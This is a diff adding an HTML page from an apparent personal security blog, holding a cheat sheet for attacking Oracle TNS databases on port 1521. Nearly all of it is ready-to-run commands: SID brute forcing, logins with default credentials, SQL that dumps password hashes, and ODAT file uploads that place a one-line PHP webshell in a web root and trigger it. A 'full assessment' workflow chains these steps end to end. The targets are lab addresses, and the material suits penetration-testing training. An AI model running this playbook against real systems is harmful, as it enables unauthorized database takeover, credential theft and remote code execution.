@@ -1,0 +1,370 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Oracle-TNS-Port-1521"><a href="#Oracle-TNS-Port-1521" class="headerlink" title="Oracle TNS (Port 1521)"></a>Oracle TNS (Port 1521)</h1><p>Enumerate and exploit Oracle Transparent Network Substrate (TNS) and Oracle databases to dump credentials and upload files.<br>Oracle TNS facilitates communication between Oracle databases and applications, commonly found on enterprise database servers.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><h3 id="Discover-Oracle-TNS"><a href="#Discover-Oracle-TNS" class="headerlink" title="Discover Oracle TNS"></a>Discover Oracle TNS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p1521 -sV 10.10.10.10 --open</span><br></pre></td></tr></table></figure>
+
+<h3 id="Brute-Force-SID"><a href="#Brute-Force-SID" class="headerlink" title="Brute Force SID"></a>Brute Force SID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nmap -p1521 --script oracle-sid-brute 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="Connect-to-Database"><a href="#Connect-to-Database" class="headerlink" title="Connect to Database"></a>Connect to Database</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlplus scott/tiger@10.10.10.10/XE</span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Nmap-Scripts"><a href="#Nmap-Scripts" class="headerlink" title="Nmap Scripts"></a>Nmap Scripts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Oracle TNS version</span></span><br><span class="line"><span class="built_in">sudo</span> nmap -p1521 -sV 10.10.10.10 --open</span><br><span class="line"></span><br><span class="line"><span class="comment"># SID brute force</span></span><br><span class="line"><span class="built_in">sudo</span> nmap -p1521 --script oracle-sid-brute 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># TNS version</span></span><br><span class="line"><span class="built_in">sudo</span> nmap -p1521 --script oracle-tns-version 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<h3 id="ODAT-Oracle-Database-Attacking-Tool"><a href="#ODAT-Oracle-Database-Attacking-Tool" class="headerlink" title="ODAT (Oracle Database Attacking Tool)"></a>ODAT (Oracle Database Attacking Tool)</h3><h4 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Download Oracle Instant Client</span></span><br><span class="line">wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip</span><br><span class="line">wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mkdir</span> -p /opt/oracle</span><br><span class="line"><span class="built_in">sudo</span> unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip</span><br><span class="line"><span class="built_in">sudo</span> unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set environment variables</span></span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:<span class="variable">$LD_LIBRARY_PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$LD_LIBRARY_PATH</span>:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Clone ODAT</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/quentinhardy/odat.git</span><br><span class="line"><span class="built_in">cd</span> odat/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install dependencies</span></span><br><span class="line">pip3 install cx_Oracle python-libnmap colorlog termcolor passlib pycryptodome</span><br><span class="line"><span class="built_in">sudo</span> apt-get install python3-scapy build-essential libgmp-dev -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize submodules</span></span><br><span class="line">git submodule init</span><br><span class="line">git submodule update</span><br></pre></td></tr></table></figure>
+
+<h4 id="Run-All-ODAT-Modules"><a href="#Run-All-ODAT-Modules" class="headerlink" title="Run All ODAT Modules"></a>Run All ODAT Modules</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./odat.py all -s 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># With credentials</span></span><br><span class="line">./odat.py all -s 10.10.10.10 -d XE -U scott -P tiger</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQLPlus-Connection"><a href="#SQLPlus-Connection" class="headerlink" title="SQLPlus Connection"></a>SQLPlus Connection</h2><h3 id="Basic-Connection"><a href="#Basic-Connection" class="headerlink" title="Basic Connection"></a>Basic Connection</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Connect with credentials</span></span><br><span class="line">sqlplus scott/tiger@10.10.10.10/XE</span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect as SYSDBA</span></span><br><span class="line">sqlplus scott/tiger@10.10.10.10/XE as sysdba</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fix-Library-Error"><a href="#Fix-Library-Error" class="headerlink" title="Fix Library Error"></a>Fix Library Error</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If you get libsqlplus.so error</span></span><br><span class="line"><span class="built_in">sudo</span> sh -c <span class="string">&quot;echo /usr/lib/oracle/12.2/client64/lib &gt; /etc/ld.so.conf.d/oracle-instantclient.conf&quot;</span></span><br><span class="line"><span class="built_in">sudo</span> ldconfig</span><br></pre></td></tr></table></figure>
+
+<h2 id="Database-Enumeration"><a href="#Database-Enumeration" class="headerlink" title="Database Enumeration"></a>Database Enumeration</h2><h3 id="List-Tables"><a href="#List-Tables" class="headerlink" title="List Tables"></a>List Tables</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- List all tables</span></span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> all_tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- List user tables</span></span><br><span class="line"><span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> user_tables;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Check-Privileges"><a href="#Check-Privileges" class="headerlink" title="Check Privileges"></a>Check Privileges</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- Check user privileges</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_role_privs;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Check system privileges</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_sys_privs;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Extract-Password-Hashes"><a href="#Extract-Password-Hashes" class="headerlink" title="Extract Password Hashes"></a>Extract Password Hashes</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- Dump password hashes (requires SYSDBA)</span></span><br><span class="line"><span class="keyword">SELECT</span> name, password <span class="keyword">FROM</span> sys.user$;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Alternative</span></span><br><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> dba_users;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Enumerate-Users"><a href="#Enumerate-Users" class="headerlink" title="Enumerate Users"></a>Enumerate Users</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- List all users</span></span><br><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> all_users;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- List DBA users</span></span><br><span class="line"><span class="keyword">SELECT</span> username <span class="keyword">FROM</span> dba_users;</span><br></pre></td></tr></table></figure>
+
+<h2 id="File-Upload-via-ODAT"><a href="#File-Upload-via-ODAT" class="headerlink" title="File Upload via ODAT"></a>File Upload via ODAT</h2><h3 id="Upload-File-to-Web-Root"><a href="#Upload-File-to-Web-Root" class="headerlink" title="Upload File to Web Root"></a>Upload File to Web Root</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create test file</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Oracle File Upload Test&quot;</span> &gt; testing.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload to Windows IIS</span></span><br><span class="line">./odat.py utlfile -s 10.10.10.10 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload to Linux Apache</span></span><br><span class="line">./odat.py utlfile -s 10.10.10.10 -d XE -U scott -P tiger --sysdba --putFile /var/www/html testing.txt ./testing.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Verify upload</span></span><br><span class="line">curl http://10.10.10.10/testing.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Upload-Webshell"><a href="#Upload-Webshell" class="headerlink" title="Upload Webshell"></a>Upload Webshell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Create PHP webshell</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload webshell</span></span><br><span class="line">./odat.py utlfile -s 10.10.10.10 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># Test webshell</span></span><br><span class="line">curl http://10.10.10.10/shell.php?cmd=<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Common-Web-Root-Paths"><a href="#Common-Web-Root-Paths" class="headerlink" title="Common Web Root Paths"></a>Common Web Root Paths</h2><table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux</td>
+<td><code>/var/www/html</code></td>
+</tr>
+<tr>
+<td>Windows</td>
+<td><code>C:\inetpub\wwwroot</code></td>
+</tr>
+</tbody></table>
+<h2 id="SID-Enumeration"><a href="#SID-Enumeration" class="headerlink" title="SID Enumeration"></a>SID Enumeration</h2><h3 id="What-is-SID"><a href="#What-is-SID" class="headerlink" title="What is SID?"></a>What is SID?</h3><ul>
+<li>SID (System Identifier) identifies the database instance</li>
+<li>Required for connection string</li>
+<li>Common SIDs: XE, ORCL, PROD, DEV</li>
+</ul>
+<h3 id="Brute-Force-SID-1"><a href="#Brute-Force-SID-1" class="headerlink" title="Brute Force SID"></a>Brute Force SID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Nmap</span></span><br><span class="line"><span class="built_in">sudo</span> nmap -p1521 --script oracle-sid-brute 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># ODAT</span></span><br><span class="line">./odat.py sidguesser -s 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># Metasploit</span></span><br><span class="line">use auxiliary/scanner/oracle/sid_brute</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="Default-Credentials"><a href="#Default-Credentials" class="headerlink" title="Default Credentials"></a>Default Credentials</h2><h3 id="Common-Oracle-Accounts"><a href="#Common-Oracle-Accounts" class="headerlink" title="Common Oracle Accounts"></a>Common Oracle Accounts</h3><table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>sys</td>
+<td>change_on_install</td>
+<td>System account</td>
+</tr>
+<tr>
+<td>system</td>
+<td>manager</td>
+<td>System account</td>
+</tr>
+<tr>
+<td>scott</td>
+<td>tiger</td>
+<td>Demo account</td>
+</tr>
+<tr>
+<td>dbsnmp</td>
+<td>dbsnmp</td>
+<td>SNMP account</td>
+</tr>
+<tr>
+<td>sysman</td>
+<td>sysman</td>
+<td>Enterprise Manager</td>
+</tr>
+</tbody></table>
+<h2 id="Metasploit-Modules"><a href="#Metasploit-Modules" class="headerlink" title="Metasploit Modules"></a>Metasploit Modules</h2><h3 id="SID-Enumeration-1"><a href="#SID-Enumeration-1" class="headerlink" title="SID Enumeration"></a>SID Enumeration</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/sid_enum</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h3 id="TNS-Version"><a href="#TNS-Version" class="headerlink" title="TNS Version"></a>TNS Version</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/tnspoison_checker</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h3 id="Login-Scanner"><a href="#Login-Scanner" class="headerlink" title="Login Scanner"></a>Login Scanner</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.10.10.10</span><br><span class="line"><span class="built_in">set</span> SID XE</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h2 id="Configuration-Files"><a href="#Configuration-Files" class="headerlink" title="Configuration Files"></a>Configuration Files</h2><h3 id="tnsnames-ora"><a href="#tnsnames-ora" class="headerlink" title="tnsnames.ora"></a>tnsnames.ora</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ORCL =</span><br><span class="line">  (DESCRIPTION =</span><br><span class="line">    (ADDRESS_LIST =</span><br><span class="line">      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.10.10.10)(PORT = 1521))</span><br><span class="line">    )</span><br><span class="line">    (CONNECT_DATA =</span><br><span class="line">      (SERVER = DEDICATED)</span><br><span class="line">      (SERVICE_NAME = orcl)</span><br><span class="line">    )</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>
+
+<h3 id="listener-ora"><a href="#listener-ora" class="headerlink" title="listener.ora"></a>listener.ora</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SID_LIST_LISTENER =</span><br><span class="line">  (SID_LIST =</span><br><span class="line">    (SID_DESC =</span><br><span class="line">      (SID_NAME = PDB1)</span><br><span class="line">      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)</span><br><span class="line">      (GLOBAL_DBNAME = PDB1)</span><br><span class="line">    )</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">LISTENER =</span><br><span class="line">  (DESCRIPTION_LIST =</span><br><span class="line">    (DESCRIPTION =</span><br><span class="line">      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))</span><br><span class="line">    )</span><br><span class="line">  )</span><br></pre></td></tr></table></figure>
+
+<h2 id="Common-Workflow"><a href="#Common-Workflow" class="headerlink" title="Common Workflow"></a>Common Workflow</h2><h3 id="Full-Oracle-Assessment"><a href="#Full-Oracle-Assessment" class="headerlink" title="Full Oracle Assessment"></a>Full Oracle Assessment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. Discover Oracle TNS</span></span><br><span class="line"><span class="built_in">sudo</span> nmap -p1521 -sV 10.10.10.10 --open</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Brute force SID</span></span><br><span class="line"><span class="built_in">sudo</span> nmap -p1521 --script oracle-sid-brute 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. Run ODAT enumeration</span></span><br><span class="line">./odat.py all -s 10.10.10.10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. If credentials found, connect</span></span><br><span class="line">sqlplus scott/tiger@10.10.10.10/XE</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. Check privileges</span></span><br><span class="line">SELECT * FROM user_role_privs;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. Try SYSDBA access</span></span><br><span class="line">sqlplus scott/tiger@10.10.10.10/XE as sysdba</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. Extract password hashes</span></span><br><span class="line">SELECT name, password FROM sys.user$;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 8. Upload webshell if web server present</span></span><br><span class="line">./odat.py utlfile -s 10.10.10.10 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 9. Verify upload</span></span><br><span class="line">curl http://10.10.10.10/shell.php?cmd=<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>Oracle TNS:</strong></p>
+<ul>
+<li>Communication protocol for Oracle databases</li>
+<li>Port 1521 is default</li>
+<li>Requires SID to connect</li>
+<li>Can be remotely managed in Oracle 8i&#x2F;9i</li>
+</ul>
+<p><strong>SYSDBA Privilege:</strong></p>
+<ul>
+<li>Highest privilege level in Oracle</li>
+<li>Allows complete database control</li>
+<li>Can read&#x2F;write any file</li>
+<li>Can extract all password hashes</li>
+</ul>
+<p><strong>File Upload Requirements:</strong></p>
+<ul>
+<li>Need SYSDBA or DBA privileges</li>
+<li>Must know web root path</li>
+<li>Web server must be running</li>
+<li>File system permissions must allow writes</li>
+</ul>
+<p><strong>Security Considerations:</strong></p>
+<ul>
+<li>Default credentials commonly unchanged</li>
+<li>SID can be brute forced</li>
+<li>SYSDBA access allows complete compromise</li>
+<li>File upload can lead to code execution</li>
+<li>Password hashes can be extracted and cracked</li>
+</ul>
+<p><strong>Common Misconfigurations:</strong></p>
+<ul>
+<li>Default credentials (scott&#x2F;tiger, sys&#x2F;change_on_install)</li>
+<li>Weak passwords</li>
+<li>Unnecessary SYSDBA privileges</li>
+<li>TNS listener exposed to internet</li>
+<li>Outdated Oracle versions with known vulnerabilities</li>
+</ul>
+<p><strong>Attack Surface:</strong></p>
+<ul>
+<li>Default credentials</li>
+<li>SID enumeration</li>
+<li>Password hash extraction</li>
+<li>File upload to web root</li>
+<li>SQL injection in applications</li>
+<li>TNS poisoning</li>
+</ul>
+<p><strong>ODAT Capabilities:</strong></p>
+<ul>
+<li>SID enumeration</li>
+<li>Credential brute forcing</li>
+<li>Privilege enumeration</li>
+<li>Password hash extraction</li>
+<li>File upload&#x2F;download</li>
+<li>Command execution</li>
+<li>Java stored procedure abuse</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
